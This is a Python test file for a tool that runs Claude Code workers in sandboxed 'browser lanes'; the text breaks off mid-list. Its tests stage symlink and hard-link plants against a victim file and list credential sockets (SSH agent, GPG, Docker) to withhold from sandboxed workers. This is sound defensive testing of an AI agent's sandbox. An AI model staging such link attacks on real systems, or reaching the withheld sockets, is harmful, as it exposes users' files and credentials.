"""Browser lanes (docs/superpowers/specs/2026-10-08-browser-lane-design.md). These run on the Pi with fakes: a patched
sys.platform, a patched Claude Code version, lsof fixtures, a fake fetch and a fake clock. The Mac acceptance run is
team/scripts/lane_acceptance.py.

Run: make check-team (from the superyak root)
"""
import base64
import fcntl
import hashlib
import http.client
import io
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import tarfile
import threading
import time
import tomllib
import urllib.request
from pathlib import Path

import pytest

from superyak_team import lane, teamd, teamlib, workers

MOCK_BIN = Path(__file__).resolve().parent / "mock-bin"


@pytest.fixture
def env(tmp_path, monkeypatch):
    repo = tmp_path / "repo"
    repo.mkdir()
    for cmd in (["init", "-q"], ["config", "user.email", "t@t"], ["config", "user.name", "t"]):
        subprocess.run(["git", "-C", str(repo)] + cmd, check=True)
    (repo / "README.md").write_text("toy\n")
    subprocess.run(["git", "-C", str(repo), "add", "."], check=True)
    subprocess.run(["git", "-C", str(repo), "commit", "-qm", "init"], check=True)
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
    monkeypatch.setenv("SUPERYAK_TEAM_HOME", str(tmp_path / "teamhome"))
    monkeypatch.setenv("SUPERYAK_TEAM_CONFIG", str(tmp_path / "cfg.json"))
    monkeypatch.setenv("SUPERYAK_TEAM_TOKEN_STORE", "file")
    monkeypatch.setenv("PATH", "%s:%s" % (MOCK_BIN, os.environ["PATH"]))
    monkeypatch.setenv("MOCK_TEAM_LOG", str(tmp_path / "agent.log"))
    monkeypatch.setattr(lane, "MANAGED_SETTINGS", tmp_path / "managed-settings.json")
    monkeypatch.setattr(lane, "UNSAFE_ROOTS", ())          # the tests' own folders are under /tmp
    return {"repo": repo, "tmp": tmp_path, "home": home}


@pytest.fixture
def mac(monkeypatch):
    """A Mac with a new enough Claude Code and Python, as far as the spawn checks can tell."""
    monkeypatch.setattr(lane.sys, "platform", "darwin")
    monkeypatch.setattr(lane, "claude_version", lambda: (2, 1, 290))
    monkeypatch.setattr(lane, "python_ok", lambda: True)
    # From Task 8, spawn installs and checks the broker's Playwright and browser before taking teamd's lock.
    monkeypatch.setattr(lane, "prepare_broker", lambda repo, base, worktrees, **kw: None, raising=False)


@pytest.fixture(autouse=True)
def end_every_turn(monkeypatch):
    """T8: no test leaves a mock turn or a prepare running. Every process workers.launch or start_prepare starts (each in
    its own session) is ended, with its whole group, when the test ends, whatever the test did."""
    started = []
    real_launch, real_prepare = workers.launch, workers.start_prepare

    def launch(*a, **kw):
        started.append(real_launch(*a, **kw))
        return started[-1]

    def start_prepare(*a, **kw):
        started.append(real_prepare(*a, **kw))
        return started[-1]
    monkeypatch.setattr(workers, "launch", launch)
    monkeypatch.setattr(workers, "start_prepare", start_prepare)
    yield
    for proc in started:
        if getattr(proc, "poll", None) is None or not hasattr(proc, "pid"):
            continue
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except OSError:
            pass
        try:
            proc.wait(timeout=5)
        except (subprocess.TimeoutExpired, AttributeError, TypeError):
            pass


def lane_team(env, team_id="t1", **cfg_over):
    cfg = dict(teamlib.DEFAULT_CONFIG, browser_lane=True, max_workers=4)
    cfg.update(cfg_over)
    return teamd.Team(team_id, env["repo"], "toy goal", cfg)


def lead(team, op, args):
    return team.handle({"op": op, "caller": "lead", "token": teamlib.get_token(team.team_id, "lead"), "args": args})


# ---------- Task 1: who sets browser_lane, and who gets a lane ----------

def test_browser_lane_is_set_by_a_person_never_by_team_start(env, tmp_path, monkeypatch):
    """Spec unit test 4."""
    assert teamlib.team_config()["browser_lane"] is False
    (tmp_path / "cfg.json").write_text(json.dumps({"browser_lane": True}))
    assert teamlib.team_config()["browser_lane"] is True                       # config.json
    (tmp_path / "cfg.json").write_text("{}")
    presets = tmp_path / "presets.json"
    presets.write_text(json.dumps({"lane": {"description": "UX checks", "browser_lane": True}}))
    monkeypatch.setenv("SUPERYAK_TEAM_PRESETS", str(presets))
    assert teamlib.team_config("lane")["browser_lane"] is True                  # a preset
    with pytest.raises(teamlib.RejectedMessage, match="browser_lane can't be set in team_start"):
        teamlib.team_config(None, {"browser_lane": True})
    with pytest.raises(teamlib.RejectedMessage, match="browser_lane can't be set in team_start"):
        teamlib.team_config("lane", {"browser_lane": False})                    # not even to turn it off
    for bad in ("yes", 1, None):
        presets.write_text(json.dumps({"lane": {"browser_lane": bad}}))
        with pytest.raises(teamlib.RejectedMessage, match="browser_lane must be true or false"):
            teamlib.team_config("lane")
        (tmp_path / "cfg.json").write_text(json.dumps({"browser_lane": bad}))
        with pytest.raises(teamlib.RejectedMessage, match="browser_lane must be true or false"):
            teamlib.team_config()
        (tmp_path / "cfg.json").write_text("{}")
    assert "browser_lane" in teamlib.PRESET_KEYS and "browser_lane" not in teamlib.OVERRIDE_KEYS
    assert teamlib.PRESET_KEYS - teamlib.OVERRIDE_KEYS == {"browser_lane"}


def test_status_shows_browser_lane(env):
    team = lane_team(env)
    assert team.status()["config"]["browser_lane"] is True


@pytest.mark.parametrize("case, kind, mode, setup, reason", [
    ("codex", "codex", "build", None, "for Claude workers only"),
    ("collab", "claude", "collab", None, "for builders only"),
    ("lane off", "claude", "build", "off", "browser lanes are off for this team"),
    ("linux", "claude", "build", "linux", "macOS only"),
    ("old python", "claude", "build", "python", "needs teamd on Python 3.11.4 or later"),
    ("old claude", "claude", "build", "old", "needs Claude Code 2.1.285 or later \\(found 2.1.284\\)"),
    ("no claude", "claude", "build", "none", "needs Claude Code 2.1.285 or later \\(found none\\)"),
    ("user allowlist", "claude", "build", "domains", "adds sandbox.network.allowedDomains"),
    ("user webfetch", "claude", "build", "webfetch", "allows WebFetch"),
    ("local mach", "claude", "build", "mach", "settings.local.json adds sandbox.network.allowMachLookup"),
    ("managed mach", "claude", "build", "managed", "managed-settings.json adds sandbox.network.allowMachLookup"),
    ("unreadable", "claude", "build", "broken", "settings.json can't be read"),
])
def test_a_browser_spawn_is_refused_with_its_reason(env, mac, monkeypatch, case, kind, mode, setup, reason):
    """Spec unit test 3: each refusal names its reason, and nothing is created."""
    claude_dir = env["home"] / ".claude"
    claude_dir.mkdir()
    if setup == "linux":
        monkeypatch.setattr(lane.sys, "platform", "linux")
    if setup == "python":
        monkeypatch.setattr(lane, "python_ok", lambda: False)
    if setup == "old":
        monkeypatch.setattr(lane, "claude_version", lambda: (2, 1, 284))
    if setup == "none":
        monkeypatch.setattr(lane, "claude_version", lambda: None)
    if setup == "domains":
        (claude_dir / "settings.json").write_text(json.dumps({"sandbox": {"network": {"allowedDomains": ["github.com"]}}}))
    if setup == "webfetch":
        (claude_dir / "settings.json").write_text(json.dumps({"permissions": {"allow": ["WebFetch(domain:example.com)"]}}))
    if setup == "mach":
        (claude_dir / "settings.local.json").write_text(json.dumps({"sandbox": {"network": {"allowMachLookup": ["*"]}}}))
    if setup == "managed":
        lane.MANAGED_SETTINGS.write_text(json.dumps({"sandbox": {"network": {"allowMachLookup": ["com.apple.x"]}}}))
    if setup == "broken":
        (claude_dir / "settings.json").write_text("{not json")
    team = lane_team(env, browser_lane=(setup != "off"))
    with pytest.raises(teamlib.RejectedMessage, match=reason):
        team.spawn("check the login page", kind, mode=mode, browser=True)
    assert team.state["workers"] == {}
    assert not (env["repo"].parent / "repo-worktrees").exists()


def test_a_browser_spawn_needs_a_strict_bool(env, mac):
    team = lane_team(env)
    for bad in ("yes", "true", 1, None):
        with pytest.raises(teamlib.RejectedMessage, match="browser must be true or false"):
            team.spawn("t", "claude", browser=bad)
        with pytest.raises(teamlib.RejectedMessage, match="browser must be true or false"):
            lead(team, "spawn", {"task": "t", "kind": "claude", "browser": bad})
    assert team.state["workers"] == {}


def test_a_browser_worker_is_recorded_and_others_are_not(env, mac, monkeypatch):
    monkeypatch.setattr(teamd.Team, "_fill_slots", lambda self: None)   # no turn: this is about the record
    team = lane_team(env)
    r = lead(team, "spawn", {"task": "check the login page", "kind": "claude", "browser": True})
    assert team.state["workers"][r["worker"]]["browser"] is True
    r = lead(team, "spawn", {"task": "write docs", "kind": "claude"})
    assert team.state["workers"][r["worker"]]["browser"] is False
    saved = json.loads((team.dir / "state.json").read_text())
    assert saved["workers"]["kaylee"]["browser"] is True


def test_team_spawn_offers_browser_as_a_boolean(env):
    from superyak_team import mcp      # here, not at the top: mcp reads SUPERYAK_TEAM_ROLE when it is imported
    spawn = [t for t in mcp.LEAD_TOOLS if t[0] == "team_spawn"][0]
    assert spawn[2]["browser"]["type"] == "boolean"


# ---------- Task 2: the lane's directory, its port block and the preload ----------

@pytest.fixture
def tmp_root(tmp_path, monkeypatch):
    """lane.TMP_ROOT stands in for /tmp."""
    root = tmp_path / "tmp"
    root.mkdir()
    monkeypatch.setattr(lane, "TMP_ROOT", root)
    return root


@pytest.fixture
def held(env):
    """Teams whose teamd is running, as far as the registry can tell: this test holds their locks."""
    files = {}

    def hold(team_id):
        files[team_id] = lane.hold_team(team_id)
    yield hold
    for f in files.values():
        f.close()


def stat_mode(st):
    return st.st_mode & 0o7777


def test_the_lane_parent_is_private_or_refused(env, tmp_root, monkeypatch):
    """Spec unit test 6: created 0700; refused with another owner, another mode, or as a symlink."""
    parent = lane.private_parent()
    st = os.lstat(parent)
    assert parent == tmp_root / ("sy-lane-%d" % os.getuid())
    assert stat_mode(st) == 0o700 and st.st_uid == os.getuid()
    os.chmod(parent, 0o755)
    with pytest.raises(lane.LaneRefused, match="mode 755, not 700"):
        lane.private_parent()
    assert stat_mode(os.lstat(parent)) == 0o755                     # refused, never repaired
    os.rmdir(parent)
    elsewhere = env["tmp"] / "elsewhere"
    elsewhere.mkdir(mode=0o700)
    os.symlink(elsewhere, parent)
    with pytest.raises(lane.LaneRefused, match="not a directory you own"):
        lane.private_parent()
    os.unlink(parent)
    real_uid = os.getuid()
    monkeypatch.setattr(lane.os, "getuid", lambda: real_uid + 1)   # the folder is ours, the "user" is someone else
    with pytest.raises(lane.LaneRefused, match="not a directory you own"):
        lane.private_parent()


def test_a_parent_that_vanishes_is_refused_not_raised(env, tmp_root, monkeypatch):
    """Review (M5): a process that can write /tmp may remove the parent between mkdir and lstat; teamd must get
    LaneRefused, never a raw OSError."""
    parent = tmp_root / ("sy-lane-%d" % os.getuid())
    real_lstat = os.lstat

    def lstat(path, *args, **kwargs):
        if str(path) == str(parent):
            raise FileNotFoundError(2, "No such file or directory", str(path))
        return real_lstat(path, *args, **kwargs)
    monkeypatch.setattr(lane.os, "lstat", lstat)
    with pytest.raises(lane.LaneRefused, match="unsafe lane folder .*No such file"):
        lane.private_parent()
    with pytest.raises(lane.LaneRefused):
        lane.ensure_lane("t1", "kaylee")


def test_a_lane_has_its_folders_and_is_refused_as_a_symlink(env, tmp_root):
    """Spec unit test 6: the lane is refused when it is a symlink at turn time. The preload is no longer here
    (final fix wave, C1): it is teamd's own file, outside /tmp."""
    path = lane.ensure_lane("t1", "kaylee")
    assert path == tmp_root / ("sy-lane-%d" % os.getuid()) / lane.lane_hash("t1", "kaylee")
    assert len(path.name) == 10 and path.name == hashlib.sha256(b"t1/kaylee").hexdigest()[:10]
    assert sorted(p.name for p in path.iterdir()) == ["b", "npm-cache", "tmp"]
    assert stat_mode(os.lstat(path)) == 0o700
    assert lane.ensure_lane("t1", "kaylee") == path                  # the next turn checks it again
    victim = env["tmp"] / "victim"
    victim.mkdir()
    (path / "b").rmdir()
    os.symlink(victim, path / "b")                                     # b/ swapped for a symlink
    with pytest.raises(lane.LaneRefused, match="unsafe lane"):
        lane.ensure_lane("t1", "kaylee")
    lane.remove_lane(path)
    os.symlink(victim, path)                                           # the lane itself swapped for a symlink
    with pytest.raises(lane.LaneRefused, match="unsafe lane"):
        lane.ensure_lane("t1", "kaylee")
    with pytest.raises(lane.LaneRefused, match="unsafe lane"):
        lane.remove_lane(path)
    assert victim.is_dir() and os.listdir(victim) == []


def test_teamd_never_writes_through_a_planted_link(env, tmp_root):
    """Review: teamd writes no file in the lane any more (C1 moved the preload out), so a name planted there, as a
    hard link or a symlink to someone else's file, leaves that file as it was. The preload's own writes refuse links
    (test_a_preload_name_swapped_for_a_hard_link_is_replaced_never_written_through)."""
    path = lane.ensure_lane("t1", "kaylee")
    victim = env["home"] / ".zshrc"
    victim.write_text("export SECRET=1\n")
    os.link(victim, path / "preload.cjs")                              # a hard-link plant
    os.symlink(victim, path / "other.cjs")                             # a symlink plant
    lane.ensure_lane("t1", "kaylee")
    assert victim.read_text() == "export SECRET=1\n"


def test_removal_is_fd_safe_and_refused_without_symlink_protection(env, tmp_root, monkeypatch):
    """Spec unit test 6."""
    path = lane.ensure_lane("t1", "kaylee")
    outside = env["tmp"] / "outside"
    outside.mkdir()
    (outside / "keep.txt").write_text("keep")
    os.symlink(outside, path / "tmp" / "link")                          # a link the worker could have made in tmp/
    assert lane.remove_lane(path) is True
    assert not os.path.lexists(path) and (outside / "keep.txt").read_text() == "keep"
    assert lane.remove_lane(path) is False                             # nothing left to remove
    path = lane.ensure_lane("t1", "kaylee")

    def unsafe_rmtree(p):
        raise AssertionError("must not be called")
    unsafe_rmtree.avoids_symlink_attacks = False
    monkeypatch.setattr(lane.shutil, "rmtree", unsafe_rmtree)
    with pytest.raises(lane.LaneRefused, match="without following symlinks"):
        lane.remove_lane(path)
    assert path.is_dir()


def test_leftovers_are_this_teams_dead_workers_by_exact_hash(env, tmp_root):
    """Spec unit test 6: team bricks never touches bricks-ux, and nothing is matched by prefix."""
    dead = lane.ensure_lane("bricks", "kaylee")
    alive = lane.ensure_lane("bricks", "wash")
    other_team = lane.ensure_lane("bricks-ux", "kaylee")
    parent = dead.parent
    (parent / (dead.name + "x")).mkdir()                                # longer name with the same start
    (parent / dead.name[:9]).mkdir()                                     # a prefix of it
    workers = {"kaylee": {"state": "done"}, "wash": {"state": "idle"}, "zoe": {"state": "stopped"}}
    assert lane.leftover_lanes("bricks", workers, lane.LIVE_STATES) == [("kaylee", dead)]
    assert alive.is_dir() and other_team.is_dir()


def test_blocks_never_overlap_and_lie_in_the_pool(env, held, monkeypatch):
    """Spec unit test 7."""
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    held("t1")
    held("t2")
    bases = [lane.allocate_block("t1", "w%d" % i) for i in range(20)]
    assert len(set(bases)) == 20
    for base in bases:
        assert lane.PORT_FIRST <= base and base + lane.BLOCK - 1 <= lane.PORT_LAST
        assert (base - lane.PORT_FIRST) % lane.BLOCK == 0
    spans = sorted((b, b + lane.BLOCK - 1) for b in bases)
    assert all(a[1] < b[0] for a, b in zip(spans, spans[1:]))
    assert lane.allocate_block("t1", "w3") == bases[3]                     # a lane keeps its block
    assert lane.allocate_block("t1", "w%d" % 20) == lane.PORT_FIRST + 20 * lane.BLOCK
    lane.release_block("t1", "w0")
    assert lane.allocate_block("t2", "kaylee") == lane.PORT_FIRST          # freed blocks are reused
    assert 48968 + lane.BLOCK - 1 == lane.PORT_LAST                        # the last block ends at 48999
    registry = teamlib.team_home() / "lane-ports.json"
    assert stat_mode(os.stat(registry)) == 0o600 and not registry.with_name("lane-ports.json.tmp").exists()


def test_a_block_something_else_uses_is_skipped(env, held, monkeypatch):
    """Spec unit test 7."""
    held("t1")
    busy = {41000, 41040}                                                 # one port in each of the first two blocks
    monkeypatch.setattr(lane, "port_free", lambda port: port not in busy)
    assert lane.allocate_block("t1", "kaylee") == 41064
    monkeypatch.setattr(lane, "port_free", lambda port: False)
    with pytest.raises(lane.LaneRefused, match="no free block of 32 loopback ports"):
        lane.allocate_block("t1", "wash")


def test_port_free_sees_a_real_listener_on_either_loopback():
    """Review (N9): a server on ::1 alone holds the port too."""
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    s.listen()
    try:
        assert lane.port_free(s.getsockname()[1]) is False
    finally:
        s.close()
    try:
        s6 = socket.socket(socket.AF_INET6)
        s6.bind(("::1", 0))
    except OSError:
        pytest.skip("no IPv6 loopback here")
    s6.listen()
    try:
        assert lane.port_free(s6.getsockname()[1]) is False
    finally:
        s6.close()


def test_a_team_is_alive_while_its_teamd_holds_the_lock(env):
    """Review: liveness is a lock teamd holds for its whole life, never a pid that could be reused. A teamd that is
    just exiting gets about a second to let go (N11)."""
    assert lane.team_alive("t1") is False
    f = lane.hold_team("t1")
    assert lane.team_alive("t1") is True
    started = time.monotonic()
    with pytest.raises(lane.LaneRefused, match="another teamd already runs team t1"):
        lane.hold_team("t1")
    assert time.monotonic() - started >= 0.9
    threading.Timer(0.3, f.close).start()                                  # the old teamd exits meanwhile
    lane.hold_team("t1").close()
    assert lane.team_alive("t1") is False


def test_only_blocks_of_a_running_teamd_count_as_live(env, held, monkeypatch):
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    held("t1")
    mine = lane.allocate_block("t1", "kaylee")
    f = lane.hold_team("t2")
    theirs = lane.allocate_block("t2", "kaylee")
    assert lane.live_blocks() == [mine, theirs]
    f.close()                                                             # t2's teamd is gone
    assert lane.live_blocks() == [mine]


def test_a_dead_teamds_block_is_reclaimed_only_when_nothing_uses_it(env, held, monkeypatch):
    """Review: a block whose teamd is gone returns to the pool once its worker isn't alive and its ports are free."""
    busy = set()
    monkeypatch.setattr(lane, "port_free", lambda port: port not in busy)
    locks = [lane.hold_team(team_id) for team_id in ("gone", "restarting", "serving")]
    for team_id in ("gone", "restarting", "serving"):
        lane.allocate_block(team_id, "kaylee")                            # 41000, 41032, 41064
    for f in locks:                                                       # then their teamds die
        f.close()
    state = teamlib.team_dir("restarting")                                 # its teamd is down, its worker still alive
    state.mkdir(parents=True)
    (state / "state.json").write_text(json.dumps({"workers": {"kaylee": {"state": "idle"}}}))
    busy.add(41064 + 3)                                                   # "serving" left a server running
    held("t1")
    assert lane.allocate_block("t1", "kaylee") == 41000                   # "gone" was reclaimed
    assert lane.block_of("restarting", "kaylee") == 41032 and lane.block_of("serving", "kaylee") == 41064


def test_a_damaged_registry_refuses_lanes(env, tmp_root, held):
    """Review: a corrupt registry never forgets blocks silently."""
    held("t1")
    registry = teamlib.team_home() / "lane-ports.json"
    registry.parent.mkdir(parents=True, exist_ok=True)
    for text in ("{not json", json.dumps(["a list"]), json.dumps({"abc": {"base": "41000"}})):
        registry.write_text(text)
        with pytest.raises(lane.LaneRefused, match="is damaged"):
            lane.allocate_block("t1", "kaylee")
        assert lane.block_of("t1", "kaylee") is None
        with pytest.raises(lane.LaneRefused, match="is damaged"):
            lane.live_blocks()


def test_one_lane_per_machine_when_the_person_asks_for_it(env, held, tmp_path, monkeypatch):
    """Review: the fallback when a second lane could read the first one's endpoint lives in the registry, so it
    holds across teams, whatever max_workers says."""
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    held("t1")
    held("t2")
    (tmp_path / "cfg.json").write_text(json.dumps({"lane_one_at_a_time": True}))
    assert lane.allocate_block("t1", "kaylee") == 41000
    assert lane.allocate_block("t1", "kaylee") == 41000                   # the lane that holds it keeps it
    with pytest.raises(lane.LaneWait, match="one browser lane per machine at a time.*kaylee of team t1"):
        lane.allocate_block("t2", "wash")
    lane.release_block("t1", "kaylee")
    assert lane.allocate_block("t2", "wash") == 41000


@pytest.mark.skipif(not shutil.which("node"), reason="needs node")
def test_the_preload_binds_unspecified_addresses_to_loopback(tmp_path):
    """Spec unit test 11."""
    preload = teamlib.package_dir() / "lane" / "preload.cjs"
    sock = tmp_path / "s.sock"
    script = r"""
    const net = require('net'), http = require('http');
    const cases = {
      'listen(0)': s => s.listen(0), "listen(0, '0.0.0.0')": s => s.listen(0, '0.0.0.0'),
      "listen(0, '::')": s => s.listen(0, '::'), 'listen()': s => s.listen(), 'listen(cb)': s => s.listen(() => {}),
      'listen({port: 0})': s => s.listen({port: 0}), "listen({port: 0, host: '::'})": s => s.listen({port: 0, host: '::'}),
      'listen(0, backlog)': s => s.listen(0, 5), 'http listen(0)': s => s.listen(0), "explicit '127.0.0.1'": s => s.listen(0, '127.0.0.1'),
      "listen(0, '0')": s => s.listen(0, '0'), "listen(0, '::0')": s => s.listen(0, '::0'),
      "listen(0, '0:0:0:0:0:0:0:0')": s => s.listen(0, '0:0:0:0:0:0:0:0'),
    };
    const out = {};
    const all = Object.entries(cases).map(([name, start]) => new Promise(done => {
      const s = name.startsWith('http') ? http.createServer() : net.createServer();
      start(s);
      s.on('listening', () => { out[name] = s.address().address; s.close(done); });
    }));
    all.push(new Promise(done => { const u = net.createServer().listen(process.argv[1], function () { out.unix = this.address(); this.close(done); }); }));
    Promise.all(all).then(() => console.log(JSON.stringify(out)));
    """
    r = subprocess.run(["node", "--require", str(preload), "-e", script, str(sock)], capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, r.stderr
    out = json.loads(r.stdout)
    unix, explicit = out.pop("unix"), out.pop("explicit '127.0.0.1'")
    assert set(out.values()) == {"127.0.0.1"}, out
    assert len(out) == 12 and unix == str(sock) and explicit == "127.0.0.1"


# ---------- Task 2, fix round 1 ----------

def test_removal_and_lane_text_check_the_parent_too(env, tmp_root):
    """Fix 1: a parent swapped for a symlink to a folder holding <h> must not let removal reach X/<h>."""
    path = lane.ensure_lane("t1", "kaylee")
    parent = path.parent
    x = env["tmp"] / "X"
    os.rename(parent, x)
    os.symlink(x, parent)
    with pytest.raises(lane.LaneRefused):
        lane.remove_lane(path)
    assert (x / path.name / "b").is_dir()
    with pytest.raises(lane.LaneRefused):
        lane.lane_text(path / "b")


def test_lane_text_refuses_a_path_outside_the_parent(env, tmp_root):
    """Fix 7."""
    lane.private_parent()
    with pytest.raises(lane.LaneRefused):
        lane.lane_text(env["tmp"] / "elsewhere")


@pytest.mark.parametrize("damage", ["bytes", "dir", "unreadable"])
def test_an_unreadable_registry_refuses_instead_of_raising(env, held, damage):
    """Fix 2."""
    held("t1")
    registry = teamlib.team_home() / "lane-ports.json"
    registry.parent.mkdir(parents=True, exist_ok=True)
    if damage == "bytes":
        registry.write_bytes(b"\xff\xfe\x00")
    elif damage == "dir":
        registry.mkdir()
    else:
        registry.write_text("{}")
        os.chmod(registry, 0)
    try:
        with pytest.raises(lane.LaneRefused):
            lane.allocate_block("t1", "kaylee")
        with pytest.raises(lane.LaneRefused):
            lane.live_blocks()
        assert lane.block_of("t1", "kaylee") is None
        assert lane.release_block("t1", "kaylee") is False                 # fix 5: cleanup never raises; it says so
    finally:
        if damage == "unreadable":
            os.chmod(registry, 0o600)


def test_lock_and_write_failures_refuse(env, held, monkeypatch):
    """Fix 2: the lock, the team lock and the registry write."""
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    held("t1")
    lane.allocate_block("t1", "w0")
    home = teamlib.team_home()
    real_replace = os.replace
    monkeypatch.setattr(lane.os, "replace", lambda *a: (_ for _ in ()).throw(PermissionError(13, "Permission denied")))
    with pytest.raises(lane.LaneRefused):
        lane.allocate_block("t1", "w1")
    monkeypatch.setattr(lane.os, "replace", real_replace)
    (home / "lane-teams" / "t3.lock").mkdir()
    with pytest.raises(lane.LaneRefused):
        lane.hold_team("t3")
    (home / "lane-ports.lock").unlink()
    (home / "lane-ports.lock").mkdir()
    with pytest.raises(lane.LaneRefused):
        lane.allocate_block("t1", "w2")


def test_a_bad_config_or_missing_preload_refuses(env, tmp_root, held, tmp_path, monkeypatch):
    """Fix 6."""
    held("t1")
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    (tmp_path / "cfg.json").write_text("{bad")
    with pytest.raises(lane.LaneRefused):
        lane.allocate_block("t1", "kaylee")
    monkeypatch.setattr(teamlib, "package_dir", lambda: tmp_path / "nowhere")
    with pytest.raises(lane.LaneRefused):
        lane.ensure_preload("t1", "kaylee")


# ---------- Task 3: the worker's sandbox settings and environment ----------

SNAPSHOTS = Path(__file__).resolve().parent / "snapshots"


def test_without_a_lane_nothing_changes(env, monkeypatch):
    """Spec unit test 1 (the team half; agent/tests/test_runs.py has the rest). The snapshots were taken from the code
    before lanes existed, with HOME=/home/u."""
    monkeypatch.setenv("HOME", "/home/u")
    build = workers.claude_sandbox_settings("/r/wt", "build", False, repo="/r/repo")
    collab = workers.claude_sandbox_settings("/r/room", "collab", True, repo="/r/repo")
    assert json.dumps(build, indent=1) + "\n" == (SNAPSHOTS / "settings-build.json").read_text()
    assert json.dumps(collab, indent=1) + "\n" == (SNAPSHOTS / "settings-collab.json").read_text()
    assert workers.claude_sandbox_settings("/r/wt", "build", False, repo="/r/repo", lane=None) == build
    cmd = workers.claude_command(dict(teamlib.DEFAULT_CONFIG), "t1", "kaylee", "/r/wt", "go", repo="/r/repo")
    wdir = teamlib.team_dir("t1") / "workers" / "kaylee"
    assert cmd == ["claude", "-p", "go", "--output-format", "stream-json", "--verbose", "--model", "opus",
                   "--permission-mode", "dontAsk", "--settings", str(wdir / "settings.json"),
                   "--mcp-config", str(wdir / "mcp.json")]
    assert (wdir / "settings.json").read_text() == json.dumps(build)


def test_a_lane_adds_exactly_its_network_block_and_paths(env, monkeypatch):
    """Spec unit test 2: and neither the lane root nor b/ is writable."""
    monkeypatch.setenv("HOME", "/home/u")
    uid = os.getuid()
    path = "/tmp/sy-lane-%d/0123456789" % uid
    preload = "/home/u/.superyak/team/teams/t1/workers/kaylee/lane-preload.cjs"
    plain = workers.claude_sandbox_settings("/r/wt", "build", False, repo="/r/repo")
    laned = workers.claude_sandbox_settings("/r/wt", "build", False, repo="/r/repo", lane=path, preload=preload)
    assert laned["permissions"] == plain["permissions"]
    assert {k: v for k, v in laned["sandbox"].items() if k not in ("network", "filesystem")} == \
        {k: v for k, v in plain["sandbox"].items() if k != "filesystem"}
    assert laned["sandbox"]["network"] == {"allowedDomains": [], "strictAllowlist": True, "allowLocalBinding": True,
                                           "allowUnixSockets": [path + "/tmp"]}
    fs, before = laned["sandbox"]["filesystem"], plain["sandbox"]["filesystem"]
    assert fs["allowWrite"] == before["allowWrite"] + [path + "/tmp", path + "/npm-cache"]
    assert fs["allowRead"] == before["allowRead"] + [path + "/tmp", path + "/npm-cache", preload]
    assert fs["denyRead"] == before["denyRead"] + ["/tmp/sy-lane-%d" % uid, "/private/tmp/claude-%d" % uid]
    assert fs["denyWrite"] == before["denyWrite"]
    assert path not in fs["allowWrite"] and path + "/b" not in fs["allowWrite"] and preload not in fs["allowWrite"]
    assert not any(p.startswith(path + "/b") for p in fs["allowWrite"] + fs["allowRead"])
    assert set(laned) - set(plain) == {"disableAllHooks"} and laned["disableAllHooks"] is True
    cmd = workers.claude_command(dict(teamlib.DEFAULT_CONFIG), "t1", "kaylee", "/r/wt", "go", repo="/r/repo", lane=path,
                                 preload=preload)
    written = json.loads(Path(cmd[cmd.index("--settings") + 1]).read_text())
    assert written == laned


def test_a_browser_workers_environment(env, monkeypatch, tmp_path):
    """Spec unit test 5 (the worker's half): the lane variables, NODE_OPTIONS and the endpoint, and none of the
    agent sockets; a worker without a lane gets exactly what it got before."""
    path = Path("/tmp/sy-lane-%d/0123456789" % os.getuid())
    preload = Path("/home/u/.superyak/team/teams/t1/workers/kaylee/lane-preload.cjs")
    endpoint = "ws://127.0.0.1:41031/" + "ab" * 32
    extra = lane.worker_env(path, 41000, endpoint, preload)
    assert extra == {"CLAUDE_CODE_TMPDIR": str(path / "tmp"), "npm_config_cache": str(path / "npm-cache"),
                     "SUPERYAK_BROWSER_LANE": "1", "SUPERYAK_LANE_PORT_BASE": "41000",
                     "SUPERYAK_LANE_PORT_COUNT": "32", "PW_TEST_CONNECT_WS_ENDPOINT": endpoint,
                     "NODE_OPTIONS": '--require "%s"' % preload, "DISABLE_AUTOUPDATER": "1",
                     "BASH_DEFAULT_TIMEOUT_MS": "600000", "BASH_MAX_TIMEOUT_MS": "2400000"}
    for name, value in (("SSH_AUTH_SOCK", "/tmp/agent.sock"), ("GPG_AGENT_INFO", "/tmp/gpg"),
                        ("DOCKER_HOST", "unix:///var/run/docker.sock"), ("NODE_OPTIONS", "--inspect")):
        monkeypatch.setenv(name, value)
    seen = []

    class FakePopen:
        def __init__(self, cmd, **kwargs):
            seen.append(kwargs["env"])
    monkeypatch.setattr(workers.subprocess, "Popen", FakePopen)
    workers.launch(["claude", "-p", "x"], tmp_path, tmp_path / "w1", dict(extra, ENGRAM_PROJECT_ROOT="/r"),
                   drop_env=lane.DROP_ENV)
    workers.launch(["claude", "-p", "x"], tmp_path, tmp_path / "w2", {"ENGRAM_PROJECT_ROOT": "/r"})
    browser, plain = seen
    assert not {"SSH_AUTH_SOCK", "GPG_AGENT_INFO", "DOCKER_HOST"} & set(browser)
    assert {k: browser[k] for k in extra} == extra                        # NODE_OPTIONS is the preload, not teamd's
    assert plain == dict(os.environ, ENGRAM_PROJECT_ROOT="/r", VOICE_NOTIFY_MUTE="1", SUPERYAK_RUN="1")

# ---------- Task 4: the listener check (D9, D10, D11) ----------

CONTROL_CENTER = "/System/Library/CoreServices/ControlCenter.app/Contents/MacOS/ControlCenter"
HEADER_PID = ("Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)      rhiwat  shiwat    pid   "
              "epid state  options           gencnt    flags   flags1 usscnt rtncnt fltrs")
HEADER_PROCESS = ("Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)      rxbytes      "
                  "txbytes rhiwat  shiwat  process:pid  state  options           gencnt    flags   flags1 usscnt "
                  "rtncnt fltrs")
# The Mac's listeners: (proto, local address, state, pid, command). Root's cupsd and launchd (Remote Login, held by
# pid 1) are here too: netstat sees them, which lsof run as the user can't.
SOCKETS = [
    ("tcp46", "*.7000", "LISTEN", 501, "ControlCenter"), ("tcp46", "*.5000", "LISTEN", 501, "ControlCenter"),
    ("tcp4", "*.49152", "LISTEN", 612, "rapportd"), ("tcp6", "*.49153", "LISTEN", 612, "rapportd"),
    ("tcp4", "127.0.0.1.631", "LISTEN", 220, "cupsd"), ("tcp6", "::1.631", "LISTEN", 220, "cupsd"),
